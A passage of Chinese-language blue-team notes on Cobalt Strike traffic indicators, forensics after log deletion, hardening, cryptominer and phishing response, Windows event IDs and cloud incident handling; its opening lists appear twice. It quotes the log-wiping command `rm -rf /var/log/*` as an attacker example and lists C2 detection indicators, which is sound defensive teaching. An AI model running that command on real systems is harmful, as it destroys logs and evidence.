<li><strong>心跳模式</strong>：Beacon 会以固定的时间间隔（如 10s、60s）向 C2 服务器发送请求。这种高度规律性的、永不停止的通信模式，即使在机器空闲时也存在，与正常用户行为截然不同</li>
<li><strong>请求与响应载荷</strong>：心跳请求的载荷（如 Cookie、POST 数据）长度可能固定不变。而当服务器下发指令时，响应包的长度会变长。回传数据时，客户端则会发送一个 POST 请求，其 Body 部分经过加密和 Base64 编码</li>
<li><strong>HTTP 状态码</strong>：CS C2 服务器的 HTTP 响应状态码绝大多数情况下都是 <strong>200 OK</strong>，即使请求是无效的。这是其反侦察的手段之一，与正常服务器对错误请求返回 404&#x2F;500 的行为形成鲜明对比。</li>
</ul>
<p><strong>四、DNS 与横向移动</strong></p>
<p>为了绕过传统安全设备的检测，CS 提供了更高级的通信方式和行为模式</p>
<ul>
<li><strong>DNS Beacon</strong><ul>
<li><strong>查询类型</strong>：通常使用 <code>TXT</code> 和 <code>AAAA</code> 记录进行数据传输，<code>A</code> 记录用于心跳</li>
<li><strong>子域名爆破</strong>：Beacon 会频繁对特定域名进行 DNS 查询，查询的前缀是长而随机的字符串，用于编码数据</li>
<li><strong>查询频率</strong>：与 HTTP 类似，具有固定的心跳间隔，产生持续、规律的 DNS 查询流量</li>
</ul>
</li>
<li><strong>横向移动</strong><ul>
<li><strong>SMB&#x2F;TCP Beacon</strong>：用于在内网中横向移动，它们会创建命名管道或监听特定端口。异常的命名管道或内部端口连接行为是重要的检测指标</li>
</ul>
</li>
</ul>
<hr>
<h3 id="CS-流量特征-1"><a href="#CS-流量特征-1" class="headerlink" title="CS 流量特征"></a>CS 流量特征</h3><p><strong>一、HTTP&#x2F;HTTPS 通信特征</strong></p>
<p>CS 的核心通信依赖 HTTP&#x2F;HTTPS，其请求和响应具有以下独特之处：</p>
<ul>
<li><strong>请求路径 (URI)</strong><ul>
<li><strong>默认路径</strong>：早期的 CS 版本使用如 <code>/api/rc4</code>、<code>/pixel</code> 等明显特征的路径。虽然现在已不常见，但在老旧的、未及时更新的 CS 木马中仍可能出现</li>
<li><strong>伪装路径</strong>：高级攻击者会配置 <strong>Profile</strong>，将路径伪装成正常的 URL，如 <code>/login</code>、<code>/css/main.css</code>。此时，检测的关键于<strong>路径与请求方法的合理性</strong>。例如，<code>POST /css/main.css</code> 或 <code>GET /submit</code> 都是极度可疑的行为</li>
<li><strong>长度与随机性</strong>：某些配置文件会生成长而随机的路径，例如 <code>/hjd83kalsd94jfnnasd83jklfn</code>。在高频访问中，这种随机性反而成为一种异常</li>
</ul>
</li>
<li><strong>User-Agent (UA)</strong><ul>
<li><strong>默认 UA</strong>：早期的 CS 使用一些固定的、容易被识别的 UA 字符串</li>
<li><strong>伪造 UA</strong>：攻击者会伪装成常见的浏览器 UA，如 Chrome、Firefox。然而，可以从<strong>一致性和时效性</strong>来判断：如果来自同一 C2 的所有 Beacon 都使用完全相同的、且已过时的 UA 字符串，则很可能存在 CS 攻击</li>
</ul>
</li>
</ul>
<p><strong>二、TLS 证书与指纹特征</strong></p>
<p>如果 CS 使用 HTTPS 进行通信，其 TLS&#x2F;SSL 证书会留下独特的指纹，这是非常强的检测指标</p>
<ul>
<li><strong>默认证书</strong>：CS 服务器默认使用<strong>自签名证书</strong>，其 <code>Subject</code> 字段通常带有明显的默认值，例如 <code>CN=Major C. A. Lindheim</code> 或 <code>O=Internet Widgits Pty Ltd</code></li>
<li><strong>JARM 指纹</strong>：这是一种主动 TLS 指纹识别技术。CS 的默认配置具有非常固定的 JARM 指纹。即使攻击者修改了证书的主题信息，默认的 JARM 指纹在很长一段时间内仍保持不变，这使得 JARM 成为检测 CS 最有效的手段之一</li>
<li><strong>证书透明度（CT）日志</strong>：如果攻击者使用了看似合法的域名并申请了证书，我们可以通过检查该域名是否出现在 CT 日志中，来进一步确认和溯源</li>
</ul>
<p><strong>三、请求与响应行为特征</strong></p>
<p>CS 的 HTTP 通信并非简单的请求-响应，而是一种高度规律性的“心跳”模式</p>
<ul>
<li><strong>心跳模式</strong>：Beacon 会以固定的时间间隔（如 10s、60s）向 C2 服务器发送请求。这种高度规律性的、永不停止的通信模式，即使在机器空闲时也存在，与正常用户行为截然不同</li>
<li><strong>请求与响应载荷</strong>：心跳请求的载荷（如 Cookie、POST 数据）长度可能固定不变。而当服务器下发指令时，响应包的长度会变长。回传数据时，客户端则会发送一个 POST 请求，其 Body 部分经过加密和 Base64 编码</li>
<li><strong>HTTP 状态码</strong>：CS C2 服务器的 HTTP 响应状态码绝大多数情况下都是 <strong>200 OK</strong>，即使请求是无效的。这是其反侦察的手段之一，与正常服务器对错误请求返回 404&#x2F;500 的行为形成鲜明对比。</li>
</ul>
<p><strong>四、DNS 与横向移动</strong></p>
<p>为了绕过传统安全设备的检测，CS 提供了更高级的通信方式和行为模式</p>
<ul>
<li><strong>DNS Beacon</strong><ul>
<li><strong>查询类型</strong>：通常使用 <code>TXT</code> 和 <code>AAAA</code> 记录进行数据传输，<code>A</code> 记录用于心跳</li>
<li><strong>子域名爆破</strong>：Beacon 会频繁对特定域名进行 DNS 查询，查询的前缀是长而随机的字符串，用于编码数据</li>
<li><strong>查询频率</strong>：与 HTTP 类似，具有固定的心跳间隔，产生持续、规律的 DNS 查询流量</li>
</ul>
</li>
<li><strong>横向移动</strong><ul>
<li><strong>SMB&#x2F;TCP Beacon</strong>：用于在内网中横向移动，它们会创建命名管道或监听特定端口。异常的命名管道或内部端口连接行为是重要的检测指标</li>
</ul>
</li>
</ul>
<hr>
<h3 id="日志被删除如何排查"><a href="#日志被删除如何排查" class="headerlink" title="日志被删除如何排查"></a>日志被删除如何排查</h3><p><strong>1. 内存取证 (Memory Forensics)</strong></p>
<p>这是最重要的一个步骤，也是最可能找到线索的地方</p>
<p><strong>措施：</strong></p>
<ul>
<li><strong>日志进程的内存：</strong> 即使日志文件被删除，日志服务（如 <code>rsyslogd</code>、<code>journald</code> 等）在运行时，其内存中可能仍然保留着最近的日志记录</li>
<li><strong>文件系统缓存：</strong> 操作系统内核在删除文件后，可能不会立即清除其在内存中的缓存</li>
<li><strong>进程活动：</strong> 攻击者执行删除命令（例如 <code>rm -rf /var/log/*</code>）的进程信息，以及该进程的父进程、子进程，都可能存在于内存中</li>
</ul>
<p><strong>操作方法：</strong></p>
<ol>
<li><strong>紧急制作内存镜像：</strong> 在不重启系统的情况下，使用工具（如 <strong><code>LiME</code></strong>、<strong><code>FTK Imager</code></strong>、<strong><code>Magnet RAM Capture</code></strong>）立即抓取系统内存镜像</li>
<li><strong>分析内存镜像：</strong> 将抓取的内存镜像导入专业的取证工具（如 <strong><code>Volatility</code></strong>、<strong><code>Rekall</code></strong>）</li>
<li><strong>查找关键信息：</strong><ul>
<li><strong><code>pstree</code> 或 <code>pslist</code>：</strong> 查看当前和已终止的进程列表，寻找可疑的进程</li>
<li><strong><code>cmdline</code>：</strong> 查看进程的命令行参数，看看是否有 <code>rm</code> 或其他可疑的删除命令</li>
<li><strong><code>filescan</code> 或 <code>sockets</code>：</strong> 检查打开的文件句柄和网络连接，寻找与攻击者相关的线索</li>
<li><strong><code>dumpfiles</code>：</strong> 尝试从内存中恢复已删除的文件数据</li>
</ul>
</li>
</ol>
<p><strong>2. 磁盘取证 (Disk Forensics)</strong></p>
<p>即使文件被删除，数据通常不会立即被擦除，只是其在文件系统中的索引（inode）被标记为可用</p>
<p><strong>措施：</strong></p>
<ul>
<li><strong>数据残留：</strong> 只要数据块没有被新数据覆盖，就有恢复的可能性</li>
<li><strong>文件系统元数据：</strong> 文件系统的元数据（如日志删除的时间戳、执行删除的用户等）可能仍然存在</li>
</ul>
<p><strong>操作方法：</strong></p>
<ol>
<li><strong>创建磁盘镜像：</strong> 使用 <code>dd</code> 或其他取证工具（如 <code>EnCase</code>、<code>FTK</code>）对受影响的磁盘进行物理或逻辑镜像，确保不对原始数据进行任何修改</li>
<li><strong>使用文件恢复工具：</strong><ul>
<li><strong><code>foremost</code> 或 <code>scalpel</code>：</strong> 这类工具基于文件头和文件尾的特征来搜索和恢复数据，可以尝试恢复 <code>.log</code>、<code>.gz</code> 或其他可能被删除的文件</li>
<li><strong><code>extundelete</code> 或 <code>testdisk</code>：</strong> 这类工具专门针对文件系统的特性，可以恢复被删除的文件</li>
</ul>
</li>
<li><strong>分析文件系统日志（如果可用）：</strong><ul>
<li>某些文件系统（如 ext4）有自己的日志，可能会记录文件的创建、删除等操作。</li>
</ul>
</li>
</ol>
<p><strong>3. 统和服务日志检查</strong></p>
<p>虽然主日志被删了，但还有一些其他地方可以寻找线索</p>
<p><strong>措施：</strong></p>
<ul>
<li><strong>独立日志：</strong> 某些应用程序或服务有独立的日志目录，可能不在 <code>/var/log</code> 下</li>
<li><strong>审计日志：</strong> 如果系统开启了审计功能（如 <strong><code>auditd</code></strong>），它会独立记录系统调用，包括文件的删除操作。这通常是排查此类问题的“黄金”线索</li>
</ul>
<p><strong>操作方法：</strong></p>
<ul>
<li><strong>检查独立应用日志：</strong> 查看 web 服务（如 <strong>Nginx</strong> 或 <strong>Apache</strong> 的 <code>access.log</code>）、数据库、容器服务（如 <strong>Docker</strong>）的日志目录。这些日志可能记录了攻击者入侵的原始入口</li>
<li><strong>检查 <code>auditd</code> 日志：</strong> 检查 <code>/var/log/audit/audit.log</code> 或其指定位置。搜索关键词如 <code>delete</code>、<code>unlink</code>、<code>rm</code>，或者可疑的用户 ID</li>
<li><strong><code>bash</code> 历史记录：</strong> 检查 <code>/root/.bash_history</code> 或其他用户的 <code>~/.bash_history</code>。攻击者如果未清除此文件，可能会留下痕迹。不过，有经验的攻击者通常会清除或禁用此功能</li>
</ul>
<p><strong>4. 网络流量分析</strong></p>
<p>攻击者在入侵和删除日志后，可能还会进行数据回传或保持远程连接</p>
<p><strong>措施：</strong></p>
<ul>
<li><strong>攻击者通信：</strong> 可能会有与外部 C&amp;C（命令与控制）服务器的通信</li>
<li><strong>数据外泄：</strong> 攻击者可能在删除日志前已经窃取了数据</li>
</ul>
<p><strong>操作方法：</strong></p>
<ul>
<li><strong>分析网络设备日志：</strong> 检查防火墙、路由器或入侵检测系统（IDS&#x2F;IPS）的日志</li>
<li><strong>分析网络流量捕获文件：</strong> 如果在事发时有网络流量捕获（如 <code>pcap</code> 文件），可以使用 <strong><code>Wireshark</code></strong> 或 <strong><code>Zeek</code></strong> 等工具进行深度分析</li>
</ul>
<hr>
<h3 id="常见加固手段"><a href="#常见加固手段" class="headerlink" title="常见加固手段"></a>常见加固手段</h3><p><strong>1. 系统和应用程序加固</strong></p>
<ul>
<li><strong>及时更新和打补丁</strong>：定期检查并安装操作系统、应用程序和依赖库的最新补丁，以修复已知的安全漏洞</li>
<li><strong>禁用不必要的服务和端口</strong>：关闭那些不用于业务的端口和服务。例如，如果你的服务器不需要 FTP 服务，就把它禁用掉</li>
<li><strong>最小化权限原则</strong>：所有用户和程序都应该只拥有完成其任务所必需的最小权限。不要使用 root 或管理员账户来运行日常服务</li>
<li><strong>修改默认配置</strong>：更改系统、应用和设备的默认密码、默认端口和默认配置，这些默认值常常是攻击者首先尝试的目标</li>
<li><strong>日志审计</strong>：开启并配置详细的日志记录，以便在安全事件发生后进行溯源和分析。同时，需要定期审查这些日志</li>
</ul>
<p><strong>2. 网络和边界加固</strong></p>
<ul>
<li><strong>防火墙配置</strong>：在网络边界和服务器上部署防火墙，并配置严格的访问控制列表（ACL），只允许必要的流量通过</li>
<li><strong>入侵检测&#x2F;防御系统 (IDS&#x2F;IPS)</strong>：部署 IDS&#x2F;IPS 来监控网络流量，识别并阻止恶意行为，如端口扫描、缓冲区溢出攻击等</li>
<li><strong>网络分段</strong>：将网络划分为不同的区域（如生产区、开发区、办公区），并通过防火墙或 VLAN 隔离，避免攻击者从一个区域轻易地横向移动到另一个区域</li>
<li><strong>禁用非加密协议</strong>：优先使用加密协议，如 HTTPS、SSH、SFTP 等，而不是 HTTP、Telnet、FTP 等明文协议</li>
</ul>
<p><strong>3. 数据和身份管理加固</strong></p>
<ul>
<li><strong>强密码策略</strong>：强制用户使用复杂且不重复的密码，并定期更换。可以配合多因素认证（MFA）来进一步提高账户安全性</li>
<li><strong>数据加密</strong>：对敏感数据进行加密，无论是在传输过程中（例如使用 TLS&#x2F;SSL）还是在存储时（例如对数据库或磁盘进行加密）</li>
<li><strong>备份和恢复策略</strong>：制定并定期执行数据备份，并测试恢复流程，以确保在发生数据损坏或勒索软件攻击时能够快速恢复</li>
<li><strong>身份认证和授权</strong>：使用集中式的身份管理系统（如 LDAP 或活动目录），并对不同角色的用户进行精细化的权限管理</li>
</ul>
<hr>
<h3 id="挖矿病毒特征"><a href="#挖矿病毒特征" class="headerlink" title="挖矿病毒特征"></a>挖矿病毒特征</h3><p><strong>1. 异常高的 CPU 和 GPU 使用率</strong></p>
<p>这是最明显的特征。当你的电脑被植入挖矿病毒后，即使你没有运行任何大型程序（比如游戏或视频编辑软件），任务管理器或活动监视器中显示的<strong>CPU 和 GPU使用率也会异常地高</strong>，通常会持续在 90% 甚至 100% 左右。这会直接导致你的电脑性能显著下降，变得卡顿、响应迟钝</p>
<p><strong>2. 计算机过热和风扇噪音增大</strong></p>
<p>由于 CPU 和 GPU 长时间处于高负载状态，会产生大量的热量。你会发现你的电脑，尤其是笔记本电脑，<strong>机身变得非常烫</strong>。为了散热，电脑的风扇会一直高速运转，产生持续且刺耳的噪音</p>
<p><strong>3. 电池续航时间急剧缩短</strong></p>
<p>对于笔记本电脑用户来说，挖矿病毒会持续消耗电量，导致<strong>电池续航时间比平时短得多</strong>。你可能会发现，原本能用几个小时的电量，现在只用一两个小时就耗尽了</p>
<p><strong>4. 难以识别的进程</strong></p>
<p>在任务管理器中，你可能会发现一个或几个<strong>陌生的、占用大量 CPU 资源的进程</strong>。这些进程的名字往往是随机的字母和数字组合，或者伪装成正常的系统进程，例如 <code>svchost.exe</code> 或 <code>explorer.exe</code>，但它们的实际位置和正常进程不同</p>
<p><strong>5. 网络流量异常</strong></p>
<p>虽然挖矿病毒主要消耗的是计算资源，但在挖掘和提交计算结果时，也会产生一定的网络流量。你可以使用网络监控工具来检查是否有<strong>异常的、持续的对外连接</strong>，尤其是一些指向未知 IP 地址的连接</p>
<hr>
<h3 id="挖矿病毒应急思路"><a href="#挖矿病毒应急思路" class="headerlink" title="挖矿病毒应急思路"></a>挖矿病毒应急思路</h3><p><strong>1. 遏制</strong></p>
<p>当发现病毒时，首要任务是阻止其进一步扩散，并保留现场证据</p>
<ul>
<li><strong>确认事件</strong>：通过告警、资源占用异常（CPU、GPU 飙升）、网络流量异常、可疑进程等现象，确认是挖矿病毒事件</li>
<li><strong>隔离受感染主机</strong>：<ul>
<li><strong>物理隔离</strong>：最直接的方式，拔掉网线或断开 Wi-Fi 连接</li>
<li><strong>网络隔离</strong>：在交换机或防火墙上，将受感染主机的 IP 或 MAC 地址加入黑名单，或将其移动到隔离的 VLAN 中</li>
</ul>
</li>
<li><strong>保留现场</strong>：不要急于重启或关机，这会丢失宝贵的内存数据</li>
</ul>
<p><strong>2. 取证与分析</strong></p>
<p>这是溯源和清除的关键环节</p>
<ul>
<li><strong>内存取证</strong>：<ul>
<li>使用 Volatility 等工具对受感染主机的内存进行镜像</li>
<li>分析内存镜像，寻找恶意进程、网络连接、注入的 DLL、rootkit 痕迹等</li>
</ul>
</li>
<li><strong>系统取证</strong>：<ul>
<li><strong>进程分析</strong>：使用 Process Explorer 或 Process Monitor，查找 CPU 或 GPU 占用率异常的进程。注意那些名字可疑或隐藏在系统目录下的进程</li>
<li><strong>网络分析</strong>：使用 Wireshark 或 TCPView，检查是否有异常的网络连接，特别是连接到矿池的 IP 地址或域名</li>
<li><strong>文件分析</strong>：查找可疑的文件，如挖矿程序、配置文件、定时任务脚本等。注意文件的时间戳，并寻找隐藏或伪装的文件</li>
<li><strong>启动项与定时任务</strong>：检查系统的自启动项（注册表、启动文件夹）和定时任务（<code>schtasks</code>），找出病毒的持久化机制</li>
<li><strong>日志分析</strong>：<ul>
<li><strong>系统日志</strong>：检查是否有异常的登录记录、服务启动失败等</li>
<li><strong>安全日志</strong>：查看是否有暴力破解、提权等事件</li>
</ul>
</li>
</ul>
</li>
<li><strong>恶意文件分析</strong>：<ul>
<li><strong>静态分析</strong>：使用反汇编工具或在线沙箱（如 VirusTotal），查看恶意文件的哈希值、字符串、行为特征等</li>
<li><strong>动态分析</strong>：在隔离环境中运行恶意文件，观察其行为，包括创建或修改哪些文件、连接哪些 IP 地址、如何进行提权等</li>
</ul>
</li>
</ul>
<p><strong>3. 彻底清除与修复</strong></p>
<p>基于分析结果，制定详细的清除计划</p>
<ul>
<li><p><strong>清除恶意程序</strong>：</p>
<ul>
<li>根据分析结果，终止恶意进程</li>
<li>删除所有相关的恶意文件、启动项和定时任务</li>
<li>清除注册表中与病毒相关的键值</li>
</ul>
</li>
<li><p><strong>修复漏洞</strong>：</p>
<ul>
<li>如果病毒是通过系统漏洞（如永恒之蓝）传播的，立即打上相应的补丁</li>
<li>关闭不必要的端口和服务</li>
<li>修改弱口令，强制所有用户使用强密码</li>
</ul>
</li>
<li><p><strong>全网扫描</strong>：</p>
<ul>
<li>使用企业级的杀毒软件对全网进行扫描，确保没有其他被感染的主机</li>
<li>对所有主机进行安全基线检查，加固配置</li>
</ul>
<hr>
<h3 id="如何判断钓鱼邮件"><a href="#如何判断钓鱼邮件" class="headerlink" title="如何判断钓鱼邮件"></a>如何判断钓鱼邮件</h3></li>
</ul>
<p><strong>1. 检查发件人信息</strong></p>
<p>这是判断钓鱼邮件最直接、最有效的方法</p>
<ul>
<li><strong>发件人地址异常</strong>：即使邮件显示的发件人名字是你熟悉的，也要仔细查看完整的邮件地址。例如，一封声称来自“Apple”的邮件，其发件人地址可能不是 <code>@apple.com</code>，而是类似 <code>@app1e.com</code>（数字 1 替代字母 l）或者 <code>@apple-support.com</code> 的地址</li>
<li><strong>企业邮箱与公共邮箱混淆</strong>：正规公司通常会使用自己的企业邮箱后缀（如 <code>xxx@company.com</code>），而不会使用 <code>Gmail</code>、<code>Hotmail</code> 或 <code>163.com</code> 等公共邮箱发送重要通知</li>
<li><strong>发件人与内容不符</strong>：如果邮件主题是关于银行账户的，但发件人却是一个电商网站的地址，那这封邮件极有可能是钓鱼邮件</li>
</ul>
<p><strong>2. 警惕可疑的链接和附件</strong></p>
<p>钓鱼邮件的主要目的就是诱导你点击链接或下载附件</p>
<ul>
<li><strong>悬停检查链接</strong>：<strong>不要直接点击任何可疑链接</strong>。将鼠标悬停在链接上（不要点击），浏览器或邮件客户端的左下角通常会显示出真实的跳转地址。如果显示的地址与文字描述不符，或者是一个看起来杂乱无章、包含大量数字和特殊字符的网址，那么这个链接很可能有问题</li>
<li><strong>附件类型可疑</strong>：当心那些扩展名为 <code>.exe</code>、<code>.scr</code>、<code>.zip</code>、<code>.rar</code>、<code>.js</code>、<code>.vbs</code> 或 <code>.bat</code> 的附件。即使是 Word、Excel 文档，也要警惕那些要求你“启用宏”才能查看的提示，这很可能是恶意代码</li>
</ul>
<hr>
<h3 id="暴露面梳理怎么做"><a href="#暴露面梳理怎么做" class="headerlink" title="暴露面梳理怎么做"></a>暴露面梳理怎么做</h3><p><strong>1. 梳理资产</strong></p>
<p>这是暴露面梳理的第一步，也是基础。你必须知道你有什么，才能知道要保护什么</p>
<ul>
<li><strong>网络资产</strong>：识别所有 IP 地址、域名、子域名、开放端口、服务和应用</li>
<li><strong>物理资产</strong>：包括服务器、电脑、手机、IoT 设备等</li>
<li><strong>第三方资产</strong>：云服务（AWS、Azure、阿里云）、SaaS 应用（Salesforce、Workday）、外包服务商等。这些都是你无法完全控制，但可能成为攻击入口的点</li>
<li><strong>人员资产</strong>：员工、供应商、合作伙伴。人是最大的漏洞，钓鱼邮件、社会工程学都以人为目标</li>
</ul>
<p><strong>2. 识别攻击入口</strong></p>
<p>梳理完资产后，你需要从攻击者的角度思考，他们会从哪里下手</p>
<ul>
<li><strong>外部暴露面</strong>：这是最常见的攻击入口<ul>
<li><strong>Web 应用</strong>：包括网站、Web API、后台管理系统等。可能存在 SQL 注入、跨站脚本（XSS）、文件上传漏洞等</li>
<li><strong>开放端口和服务</strong>：如 SSH、RDP、FTP、数据库服务等。配置不当、弱口令、未打补丁的服务都可能被利用</li>
<li><strong>域名和子域名</strong>：子域名接管、域名劫持等都是常见的攻击手法</li>
<li><strong>邮件系统</strong>：钓鱼邮件是获取内部权限的有效方式</li>
</ul>
</li>
<li><strong>内部暴露面</strong>：一旦攻击者进入内部网络，他们会寻找更多的弱点<ul>
<li><strong>内部 Web 应用</strong>：许多内部应用的安全防护比不上外部应用</li>
<li><strong>内网资产</strong>：未打补丁的操作系统、配置错误的设备、共享文件夹权限过大等</li>
<li><strong>人员行为</strong>：员工在社交媒体上泄露公司信息、使用弱密码等</li>
</ul>
</li>
</ul>
<p><strong>3. 持续监控与更新</strong></p>
<p>暴露面梳理不是一次性的任务，而是一个持续的过程</p>
<ul>
<li><strong>自动化监控</strong>：使用自动化工具定期扫描和监控你的资产</li>
<li><strong>资产变更管理</strong>：建立资产变更登记制度，确保新上线的服务、应用都能被及时纳入梳理范围</li>
<li><strong>威胁情报</strong>：订阅威胁情报，了解最新的漏洞和攻击手法，及时更新你的防御策略</li>
</ul>
<hr>
<h3 id="netstat-和-ss-命令的区别"><a href="#netstat-和-ss-命令的区别" class="headerlink" title="netstat 和 ss 命令的区别"></a>netstat 和 ss 命令的区别</h3><p><code>netstat</code> 是一个比较传统的工具，长期以来都是网络诊断的首选。然而，随着网络流量和连接数的不断增长，<code>netstat</code> 在处理大量数据时会变得非常慢，因为它需要遍历 <code>/proc/net</code> 目录下的所有文件来收集信息</p>
<p><code>ss</code> (socket statistics) 是 <code>netstat</code> 的现代替代品，它利用了 Linux 内核中 <strong>Netlink</strong> 协议的优势。Netlink 是一种用于内核与用户空间进程之间通信的套接字机制。因此，<code>ss</code> 可以直接从内核获取套接字统计信息，而无需解析 <code>/proc</code> 文件，这使得它在性能上远远优于 <code>netstat</code>，尤其是在系统有大量连接时</p>
<hr>
<h3 id="Windows-日志存储位置"><a href="#Windows-日志存储位置" class="headerlink" title="Windows 日志存储位置"></a>Windows 日志存储位置</h3><p>主要的日志类别及其文件如下：</p>
<ul>
<li><p><strong>应用程序日志 (Application)</strong>：</p>
<ul>
<li><strong>文件路径</strong>：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li>
<li><strong>内容</strong>：记录由应用程序产生的事件，例如程序启动、停止、崩溃或错误信息</li>
</ul>
</li>
<li><p><strong>安全日志 (Security)</strong>：</p>
<ul>
<li><strong>文件路径</strong>：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li>
<li><strong>内容</strong>：记录与安全相关的事件，例如用户登录&#x2F;注销、权限更改、文件访问等。这对于应急响应和取证分析非常重要</li>
<li><strong>注意</strong>：安全日志默认是关闭许多详细审计功能的，需要通过组策略（Group Policy）来启用更详细的审计策略</li>
</ul>
</li>
<li><p><strong>系统日志 (System)</strong>：</p>
<ul>
<li><strong>文件路径</strong>：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li>
<li><strong>内容</strong>：记录由 Windows 操作系统组件产生的事件，例如驱动程序加载失败、硬件错误、服务启动&#x2F;停止等</li>
</ul>
</li>
<li><p><strong>Setup 日志 (Setup)</strong>：</p>
<ul>
<li><strong>文件路径</strong>：<code>%SystemRoot%\System32\Winevt\Logs\Setup.evtx</code></li>
<li><strong>内容</strong>：记录 Windows 安装、升级或服务包安装过程中的事件</li>
</ul>
<hr>
<h3 id="常见-Windows-事件-ID"><a href="#常见-Windows-事件-ID" class="headerlink" title="常见 Windows 事件 ID"></a>常见 Windows 事件 ID</h3></li>
</ul>
<p><strong>1. 安全事件日志（Security Log）中常见的事件 ID</strong></p>
<p>安全日志是我们进行应急响应和入侵分析时，最需要关注的。以下是一些常见的安全事件 ID 及其含义：</p>
<ul>
<li><strong>ID 4624</strong>：<strong>成功登录</strong>。这表示用户成功登录到系统。在排查入侵时，我们会特别关注登录的来源（网络登录、远程桌面等）和登录的用户</li>
<li><strong>ID 4625</strong>：<strong>登录失败</strong>。这是入侵者进行暴力破解或密码猜解的常见痕迹。当看到大量连续的 4625 事件时，通常意味着有恶意登录尝试</li>
<li><strong>ID 4648</strong>：<strong>使用显式凭据登录</strong>。这通常表示某个服务或进程使用与当前登录用户不同的凭据来运行，在排查横向移动和特权滥用时很有用</li>
<li><strong>ID 4672</strong>：<strong>分配了管理员特权</strong>。当一个用户通过提权（如 Runas）获得管理员权限时，会产生此事件</li>
<li><strong>ID 4720</strong>：<strong>创建用户账户</strong>。攻击者为了持久化控制，通常会创建新的用户。这个事件 ID 是检测账户异常创建的关键</li>
<li><strong>ID 4724</strong>：<strong>重置密码</strong>。管理员或拥有相应权限的用户重置了另一个用户的密码</li>
<li><strong>ID 4732 &#x2F; 4733</strong>：<strong>用户被添加到安全组 &#x2F; 从安全组中移除</strong>。攻击者可能会将自己的账户添加到管理员组（如 Administrators），以获取更高权限</li>
<li><strong>ID 4768 &#x2F; 4769</strong>：<strong>Kerberos 票证请求</strong>。这些事件与 Kerberos 身份验证有关，在排查域环境下的哈希传递、黄金票据等攻击时非常重要</li>
</ul>
<p><strong>2. 系统事件日志（System Log）中常见的事件 ID</strong></p>
<p>系统日志可以帮助我们了解系统运行状态和是否存在异常</p>
<ul>
<li><strong>ID 1074</strong>：<strong>系统关机或重启</strong>。如果系统意外重启，这个事件会提供关机的原因</li>
<li><strong>ID 6005</strong>：<strong>系统启动</strong>。表示事件日志服务已启动，通常在系统开机后记录</li>
<li><strong>ID 6006</strong>：<strong>系统关机</strong>。表示事件日志服务已停止，通常在系统关机前记录</li>
</ul>
<p><strong>3. 应用事件日志（Application Log）中常见的事件 ID</strong></p>
<p>应用日志帮助我们了解特定程序运行中出现的问题。</p>
<ul>
<li><strong>ID 1000</strong>：<strong>应用程序崩溃或错误</strong>。这是一个非常通用的事件 ID，表示某个应用程序遇到了错误并停止运行</li>
<li><strong>ID 1001</strong>：<strong>Windows 错误报告</strong>。记录了应用程序崩溃的详细信息，这对于定位恶意软件或服务异常终止非常有用</li>
</ul>
<hr>
<h3 id="云产品的应急思路"><a href="#云产品的应急思路" class="headerlink" title="云产品的应急思路"></a>云产品的应急思路</h3><p><strong>1. 明确责任边界</strong></p>
<p>你需要清楚地知道哪些安全责任由云服务提供商（如 AWS、Azure、GCP）承担，哪些由你承担</p>
<ul>
<li><strong>云厂商（如阿里云、腾讯云）</strong>：负责底层基础设施（物理服务器、网络、数据中心）的安全</li>
<li><strong>客户（你）</strong>：负责云上租户内的安全，包括云服务器（ECS&#x2F;CVM）、云数据库、应用系统、数据安全以及<strong>身份与访问管理（IAM）</strong></li>
</ul>
<p>在接到告警或发现异常时，第一步是判断问题是否属于你的责任范畴。例如，如果你的 ECS 实例被挖矿病毒入侵，这是你的责任；但如果云厂商的控制台出现大面积无法访问，那通常是云厂商的责任</p>
<p><strong>2. 身份与访问管理（IAM）优先</strong></p>
<p>在云环境中，<strong>API 密钥泄露</strong>是导致大规模入侵事件的常见原因。一个高权限的 AccessKey 被盗，攻击者可以利用它来创建新的云主机、删除数据、修改安全组规则，甚至进行横向移动</p>
<ul>
<li><strong>应急响应操作（以阿里云为例）</strong>：<ul>
<li><strong>立即禁用</strong>或<strong>删除</strong>可疑的 RAM 用户或 AccessKey</li>
<li><strong>排查操作日志</strong>：在**云审计（CloudTrail）**中，通过日志分析攻击者执行了哪些操作，例如 <code>RunInstances</code>、<code>DeleteObject</code> 等</li>
<li><strong>强制 MFA</strong>：对所有高权限用户强制开启多因素认证</li>
</ul>
</li>
</ul>
<p><strong>3. 利用云原生安全和监控产品</strong></p>
<p>云厂商提供了强大的日志和监控服务，它们是应急响应的“黑匣子”，能提供详细的事件时间线和攻击路径</p>
<ul>
<li><strong>阿里云</strong>：<ul>
<li><strong>云审计（ActionTrail）</strong>：记录所有 API 调用，是分析攻击者行为的核心日志</li>
<li><strong>日志服务 SLS</strong>：收集各类日志，如 ECS 的操作系统日志、VPC 流日志等，为分析提供基础</li>
<li><strong>态势感知</strong>：对云上资产进行安全评估和威胁检测，可以发现恶意文件、异常登录等</li>
</ul>
</li>
<li><strong>腾讯云</strong>：<ul>
<li><strong>云审计（CloudAudit）</strong>：记录账户下的所有 API 操作</li>
<li><strong>日志服务 CLS</strong>：提供日志收集和分析能力</li>
<li><strong>云防火墙&#x2F;安全组</strong>：监控并阻断恶意流量</li>
</ul>
</li>
<li><strong>华为云</strong>：<ul>
<li><strong>云审计服务（CTS）</strong>：记录云服务的操作事件</li>
<li><strong>网络流量分析（NTA）</strong>：分析网络流量，发现异常行为</li>
</ul>
</li>
</ul>
<p><strong>4. 隔离与遏制</strong></p>
<p>快速遏制是防止损害扩大的关键。在云上，隔离的操作更加灵活和高效</p>
<ul>
<li><strong>修改安全组&#x2F;网络 ACL</strong>：通过修改安全组或网络 ACL 规则，可以快速阻断恶意 IP 地址或端口的流量</li>
<li><strong>断开云主机网络</strong>：直接将受感染的云主机从 VPC 网络中隔离。在阿里云中，可以通过修改 ECS 的安全组使其无法访问任何网络</li>
<li><strong>创建快照</strong>：在执行任何破坏性操作前，为受感染的云主机创建快照。这个快照是进行<strong>取证分析</strong>的重要依据，可以让你在后续分析中还原当时的环境状态</li>
</ul>
<p><strong>5. 自动化与编排</strong></p>
<p>手动应急响应在面对大规模入侵时会非常缓慢。利用云厂商提供的自动化工具，可以大大提升效率</p>
<ul>
<li><strong>Serverless 函数（阿里云 FC、腾讯云 SCF）</strong>：编写函数，在收到告警（如威胁情报告警）时，自动执行响应操作，例如修改安全组、禁用 AccessKey</li>
